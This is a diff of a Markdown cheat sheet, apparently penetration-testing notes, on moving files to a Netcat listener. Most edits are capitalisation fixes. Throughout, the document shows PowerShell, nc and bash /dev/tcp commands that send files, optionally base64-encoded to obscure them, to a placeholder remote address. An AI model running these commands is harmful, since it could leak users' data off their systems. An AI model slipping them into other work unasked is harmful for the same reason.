@@ -9,7 +9,7 @@
 
 ##### If you want to send the raw contents:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
 nc -lp %ListeningPort% > file.ext
@@ -20,10 +20,11 @@ nc -lp %ListeningPort% > file.ext
 ```
 $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $Length = [System.BitConverter]::GetBytes($FileContents.Length); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
 ```
+###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
 nc -lp %ListeningPort% | base64 -d > file.ext
@@ -45,19 +46,19 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 
 ##### If you want to send the raw contents:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
 nc -lp port > file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
 nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
 
 ```
 cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -65,19 +66,19 @@ cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
 nc -lp %ListeningPort% | base64 -d > file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
 base64 -w0 file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
 
 ```
 base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -87,19 +88,19 @@ base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 
 ##### If you want to send the raw contents:
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
 nc -q 0 -lp %ListenerPort% < file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
 nc %ListenerAddress% %ListeningPort% > file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
 
 ```
 
